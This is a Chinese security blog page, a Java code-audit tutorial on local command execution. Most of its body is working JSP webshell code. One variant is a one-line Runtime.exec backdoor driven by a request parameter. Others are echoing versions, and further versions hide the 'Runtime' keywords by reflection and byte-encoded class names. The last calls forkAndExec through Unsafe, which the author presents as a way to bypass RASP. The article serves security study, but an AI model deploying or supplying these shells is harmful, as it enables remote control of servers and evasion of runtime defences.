@@ -1,0 +1,285 @@
+<!-- build time:Wed Dec 27 2023 18:05:50 GMT+0800 (Central Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="余星酒" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="余星酒" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="余星酒" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Java代码审计,Java安全基础篇"><link rel="canonical" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><title>5. java本地命令执行 - 代码审计 | 余星酒 = 余星酒 = 痴看年少风雨疾，一转本生蹉跎游</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">5. java本地命令执行</h1><div class="meta"><span class="item" title="创建时间：2023-07-20 08:46:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-07-20T08:46:00+08:00">2023-07-20</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">余星酒</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclj9410cj20zk0m8h12.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitzannuj20zk0m8b29.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="item" rel="index" title="分类于 代码审计"><span itemprop="name">代码审计</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="余星酒"><meta itemprop="description" content="痴看年少风雨疾，一转本生蹉跎游, 欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="余星酒"></span><div class="body md" itemprop="articleBody"><h1 id="java-本地命令执行"><a class="anchor" href="#java-本地命令执行">#</a> Java 本地命令执行</h1><p>Java 原生提供了对本地系统命令执行的支持，黑客通常会 <code>RCE 利用漏洞</code> 或者 <code>WebShell</code> 来执行系统终端命令控制服务器的目的。</p><p>对于开发者来说执行本地命令来实现某些程序功能 (如:ps 进程管理、top 内存管理等) 是一个正常的需求，而对于黑客来说 <code>本地命令执行</code> 是一种非常有利的入侵手段</p><h2 id="runtime-命令执行"><a class="anchor" href="#runtime-命令执行">#</a> Runtime 命令执行</h2><p>在 Java 中我们通常会使用 <code>java.lang.Runtime</code> 类的 <code>exec</code> 方法来执行本地系统命令</p><pre><code class="language-jsp">&lt;%=Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;))%&gt;
+</code></pre><ol><li><p>本地 nc 监听 1234 端口: <code>nc -vv -l 1234</code></p></li><li><p>使用浏览器访问:<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo4MDgwL2luZGV4LmpzcD9jbWQ9Y3VybCUyMGxvY2FsaG9zdDoxMjM0">http://localhost:8080/index.jsp?cmd=curl localhost:1234</span></p><p>可以在 nc 中看到已经成功的接收到了 java 执行了 <code>curl</code> 命令的请求了，如此仅需要一行代码一个最简单的本地命令执行后门也就写好了</p></li></ol><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230718182918970.png" title="image-20230718182918970"></p><p>代码虽然足够简单但是缺少了回显，稍微改下即可实现命令执行的回显了</p><pre><code class="language-jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%
+    InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();
+
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    byte[] b = new byte[1024];
+    int a = -1;
+
+    while ((a = in.read(b)) != -1) &#123;
+        baos.write(b, 0, a);
+    &#125;
+
+    out.write(&quot;&lt;pre&gt;&quot; + new String(baos.toByteArray()) + &quot;&lt;/pre&gt;&quot;);
+%&gt;
+</code></pre><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230720070531283.png" title="image-20230720070531283"></p><p><strong>Runtime ().exec 调用链</strong></p><ol><li><code>Runtime.exec(xxx)</code></li><li><code>java.lang.ProcessBuilder.start()</code></li><li><code>new java.lang.UNIXProcess(xxx)</code></li><li><code>UNIXProcess</code> 构造方法中调用了 <code>forkAndExec(xxx)</code> native 方法。</li><li><code>forkAndExec</code> 调用操作系统级别 <code>fork</code> -&gt; <code>exec</code> (*nix)/ <code>CreateProcess</code> (Windows) 执行命令并返回 <code>fork</code> / <code>CreateProcess</code> 的 <code>PID</code></li></ol><h2 id="反射-runtime-命令执行"><a class="anchor" href="#反射-runtime-命令执行">#</a> 反射 Runtime 命令执行</h2><p>如果我们不希望在代码中出现和 <code>Runtime</code> 相关的关键字，我们可以全部用反射代替。</p><pre><code>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
+
+&lt;%
+    String str = request.getParameter(&quot;str&quot;);
+
+    // 定义&quot;java.lang.Runtime&quot;字符串变量
+    String rt = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101&#125;);
+
+    // 反射 java.lang.Runtime 类获取 Class 对象
+    Class&lt;?&gt; c = Class.forName(rt);
+
+    // 反射获取 Runtime 类的 getRuntime 方法
+    Method m1 = c.getMethod(new String(new byte[]&#123;103, 101, 116, 82, 117, 110, 116, 105, 109, 101&#125;));
+
+    // 反射获取 Runtime 类的 exec 方法
+    Method m2 = c.getMethod(new String(new byte[]&#123;101, 120, 101, 99&#125;), String.class);
+
+    // 反射调用 Runtime.getRuntime().exec(xxx)方法
+    Object obj2 = m2.invoke(m1.invoke(null, new Object[]&#123;&#125;), new Object[]&#123;str&#125;);
+
+    // 反射获取 Process 类的 getInputStream 方法
+    Method m = obj2.getClass().getMethod(new String(new byte[]&#123;103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109&#125;));
+    m.setAccessible(true);
+
+    // 获取命令执行结果的输入流对象：p.getInputStream()并使用 Scanner 按行切割成字符串
+    Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]&#123;&#125;)).useDelimiter(&quot;\\A&quot;);
+    String result = s.hasNext() ? s.next() : &quot;&quot;;
+
+    // 输出命令执行结果
+    out.println(result);
+%&gt;
+</code></pre><p>命令参数是 <code>str</code> ，如： <code>reflection-cmd.jsp?str=net user</code></p><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230720074401643.png" title="image-20230720074401643"></p><h2 id="unixprocessprocessimpl"><a class="anchor" href="#unixprocessprocessimpl">#</a> UNIXProcess/ProcessImpl</h2><p><code>UNIXProcess</code> 和 <code>ProcessImpl</code> 可以理解本就是一个东西，因为在 JDK9 的时候把 <code>UNIXProcess</code> 合并到了 <code>ProcessImpl</code> 当中</p><p><code>UNIXProcess</code> 和 <code>ProcessImpl</code> 其实就是最终调用 <code>native</code> 执行系统命令的类，这个类提供了一个叫 <code>forkAndExec</code> 的 native 方法，如方法名所述主要是通过 <code>fork&amp;exec</code> 来执行本地系统命令</p><p><code>UNIXProcess</code> 类的 <code>forkAndExec</code> 示例</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">private</span> <span class="token keyword">native</span> <span class="token keyword">int</span> <span class="token function">forkAndExec</span><span class="token punctuation">(</span><span class="token keyword">int</span> mode<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> helperpath<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="2"></td><td><pre>                                   <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> prog<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>                                   <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argBlock<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>                                   <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> envBlock<span class="token punctuation">,</span> <span class="token keyword">int</span> envc<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                                   <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dir<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>                                   <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fds<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                                   <span class="token keyword">boolean</span> redirectErrorStream<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>最终执行的 <code>Java_java_lang_ProcessImpl_forkAndExec</code></p><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230720080222698.png" title="image-20230720080222698"></p><h2 id="反射unixprocessprocessimpl"><a class="anchor" href="#反射unixprocessprocessimpl">#</a> 反射 UNIXProcess/ProcessImpl</h2><p><strong><code>linux-cmd.jsp</code> 执行本地命令测试</strong></p><pre><code class="language-jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;java.io.*&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
+
+&lt;%!
+    byte[] toCString(String s) &#123;
+        if (s == null) &#123;
+            return null;
+        &#125;
+
+        byte[] bytes  = s.getBytes();
+        byte[] result = new byte[bytes.length + 1];
+        System.arraycopy(bytes, 0, result, 0, bytes.length);
+        result[result.length - 1] = (byte) 0;
+        return result;
+    &#125;
+
+    InputStream start(String[] strs) throws Exception &#123;
+        // java.lang.UNIXProcess
+        String unixClass = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115&#125;);
+
+        // java.lang.ProcessImpl
+        String processClass = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108&#125;);
+
+        Class clazz = null;
+
+        // 反射创建 UNIXProcess 或者 ProcessImpl
+        try &#123;
+            clazz = Class.forName(unixClass);
+        &#125; catch (ClassNotFoundException e) &#123;
+            clazz = Class.forName(processClass);
+        &#125;
+
+        // 获取 UNIXProcess 或者 ProcessImpl 的构造方法
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+
+        assert strs != null &amp;&amp; strs.length &gt; 0;
+
+        // Convert arguments to a contiguous block; it's easier to do
+        // memory management in Java than in C.
+        byte[][] args = new byte[strs.length - 1][];
+
+        int size = args.length; // For added NUL bytes
+        for (int i = 0; i &lt; args.length; i++) &#123;
+            args[i] = strs[i + 1].getBytes();
+            size += args[i].length;
+        &#125;
+
+        byte[] argBlock = new byte[size];
+        int    i        = 0;
+
+        for (byte[] arg : args) &#123;
+            System.arraycopy(arg, 0, argBlock, i, arg.length);
+            i += arg.length + 1;
+            // No need to write NUL bytes explicitly
+        &#125;
+
+        int[] envc    = new int[1];
+        int[] std_fds = new int[]&#123;-1, -1, -1&#125;;
+
+        FileInputStream  f0 = null;
+        FileOutputStream f1 = null;
+        FileOutputStream f2 = null;
+
+        // In theory, close() can throw IOException
+        // (although it is rather unlikely to happen here)
+        try &#123;
+            if (f0 != null) f0.close();
+        &#125; finally &#123;
+            try &#123;
+                if (f1 != null) f1.close();
+            &#125; finally &#123;
+                if (f2 != null) f2.close();
+            &#125;
+        &#125;
+
+        // 创建 UNIXProcess 或者 ProcessImpl 实例
+        Object object = constructor.newInstance(
+                toCString(strs[0]), argBlock, args.length,
+                null, envc[0], null, std_fds, false
+        );
+
+        // 获取命令执行的 InputStream
+        Method inMethod = object.getClass().getDeclaredMethod(&quot;getInputStream&quot;);
+        inMethod.setAccessible(true);
+
+        return (InputStream) inMethod.invoke(object);
+    &#125;
+
+    String inputStreamToString(InputStream in, String charset) throws IOException &#123;
+        try &#123;
+            if (charset == null) &#123;
+                charset = &quot;UTF-8&quot;;
+            &#125;
+
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            int                   a   = 0;
+            byte[]                b   = new byte[1024];
+
+            while ((a = in.read(b)) != -1) &#123;
+                out.write(b, 0, a);
+            &#125;
+
+            return new String(out.toByteArray());
+        &#125; catch (IOException e) &#123;
+            throw e;
+        &#125; finally &#123;
+            if (in != null)
+                in.close();
+        &#125;
+    &#125;
+%&gt;
+&lt;%
+    String[] str = request.getParameterValues(&quot;cmd&quot;);
+
+    if (str != null) &#123;
+        InputStream in     = start(str);
+        String      result = inputStreamToString(in, &quot;UTF-8&quot;);
+        out.println(&quot;&lt;pre&gt;&quot;);
+        out.println(result);
+        out.println(&quot;&lt;/pre&gt;&quot;);
+        out.flush();
+        out.close();
+    &#125;
+%&gt;
+</code></pre><h2 id="forkandexec-命令执行-unsafe-反射-native-方法调用"><a class="anchor" href="#forkandexec-命令执行-unsafe-反射-native-方法调用">#</a> forkAndExec 命令执行 - Unsafe+ 反射 +Native 方法调用</h2><p>如果 <code>RASP</code> 把 <code>UNIXProcess/ProcessImpl</code> 类的构造方法给拦截了我们是不是就无法执行本地命令了？其实我们可以利用 Java 的几个特性就可以绕过 RASP 执行本地命令了，具体步骤如下:</p><ol><li>使用 <code>sun.misc.Unsafe.allocateInstance(Class)</code> 特性可以无需 <code>new</code> 或者 <code>newInstance</code> 创建 <code>UNIXProcess/ProcessImpl</code> 类对象。</li><li>反射 <code>UNIXProcess/ProcessImpl</code> 类的 <code>forkAndExec</code> 方法。</li><li>构造 <code>forkAndExec</code> 需要的参数并调用。</li><li>反射 <code>UNIXProcess/ProcessImpl</code> 类的 <code>initStreams</code> 方法初始化输入输出结果流对象。</li><li>反射 <code>UNIXProcess/ProcessImpl</code> 类的 <code>getInputStream</code> 方法获取本地命令执行结果 (如果要输出流、异常流反射对应方法即可)。</li></ol><pre><code class="language-jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;sun.misc.Unsafe&quot; %&gt;
+&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
+&lt;%!
+    byte[] toCString(String s) &#123;
+        if (s == null)
+            return null;
+        byte[] bytes  = s.getBytes();
+        byte[] result = new byte[bytes.length + 1];
+        System.arraycopy(bytes, 0,
+                result, 0,
+                bytes.length);
+        result[result.length - 1] = (byte) 0;
+        return result;
+    &#125;
+
+
+%&gt;
+&lt;%
+    String[] strs = request.getParameterValues(&quot;cmd&quot;);
+
+    if (strs != null) &#123;
+        Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+        theUnsafeField.setAccessible(true);
+        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
+
+        Class processClass = null;
+
+        try &#123;
+            processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);
+        &#125; catch (ClassNotFoundException e) &#123;
+            processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);
+        &#125;
+
+        Object processObject = unsafe.allocateInstance(processClass);
+
+        // Convert arguments to a contiguous block; it's easier to do
+        // memory management in Java than in C.
+        byte[][] args = new byte[strs.length - 1][];
+        int      size = args.length; // For added NUL bytes
+
+        for (int i = 0; i &lt; args.length; i++) &#123;
+            args[i] = strs[i + 1].getBytes();
+            size += args[i].length;
+        &#125;
+
+        byte[] argBlock = new byte[size];
+        int    i        = 0;
+
+        for (byte[] arg : args) &#123;
+            System.arraycopy(arg, 0, argBlock, i, arg.length);
+            i += arg.length + 1;
+            // No need to write NUL bytes explicitly
+        &#125;
+
+        int[] envc                 = new int[1];
+        int[] std_fds              = new int[]&#123;-1, -1, -1&#125;;
+        Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);
+        Field helperpathField      = processClass.getDeclaredField(&quot;helperpath&quot;);
+        launchMechanismField.setAccessible(true);
+        helperpathField.setAccessible(true);
+        Object launchMechanismObject = launchMechanismField.get(processObject);
+        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
+
+        int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);
+
+        Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;
+                int.class, byte[].class, byte[].class, byte[].class, int.class,
+                byte[].class, int.class, byte[].class, int[].class, boolean.class
+        &#125;);
+
+        forkMethod.setAccessible(true);// 设置访问权限
+
+        int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;
+                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
+                null, envc[0], null, std_fds, false
+        &#125;);
+
+        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
+        Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);
+        initStreamsMethod.setAccessible(true);
+        initStreamsMethod.invoke(processObject, std_fds);
+
+        // 获取本地执行结果的输入流
+        Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);
+        getInputStreamMethod.setAccessible(true);
+        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        int                   a    = 0;
+        byte[]                b    = new byte[1024];
+
+        while ((a = in.read(b)) != -1) &#123;
+            baos.write(b, 0, a);
+        &#125;
+
+        out.println(&quot;&lt;pre&gt;&quot;);
+        out.println(baos.toString());
+        out.println(&quot;&lt;/pre&gt;&quot;);
+        out.flush();
+        out.close();
+    &#125;
+%&gt;
+</code></pre><div class="tags"><a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="ic i-tag"></i> Java代码审计</a> <a href="/tags/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="tag"><i class="ic i-tag"></i> Java安全基础篇</a></div></div><footer><div class="meta"></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="余星酒 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="余星酒 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="余星酒 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>余星酒 <i class="ic i-at"><em>@</em></i>余星酒</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="5. java本地命令执行">http://example.com/APT/代码审计/Java代码审计/审计基础/Java本地命令执行/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciuja1j1j20zk0m8kjl.jpg" title="4. java文件系统安全"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Java安全基础</span><h3>4. java文件系统安全</h3></a></div><div class="item right"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JDBC/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipewkhf1zj20zk0m81kx.jpg" title="6. JDBC"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Java安全基础</span><h3>6. JDBC</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">Java 本地命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#runtime-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text">Runtime 命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-runtime-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">反射 Runtime 命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unixprocessprocessimpl"><span class="toc-number">1.3.</span> <span class="toc-text">UNIXProcess&#x2F;ProcessImpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84unixprocessprocessimpl"><span class="toc-number">1.4.</span> <span class="toc-text">反射 UNIXProcess&#x2F;ProcessImpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#forkandexec-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-unsafe-%E5%8F%8D%E5%B0%84-native-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">forkAndExec 命令执行 - Unsafe+ 反射 +Native 方法调用</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/" rel="bookmark" title="idea基础使用">idea基础使用</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" rel="bookmark" title="动态代理">动态代理</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" rel="bookmark" title="类动态加载">类动态加载</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="Java序列化和反序列化">Java序列化和反序列化</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Java%E5%8F%8D%E5%B0%84/" 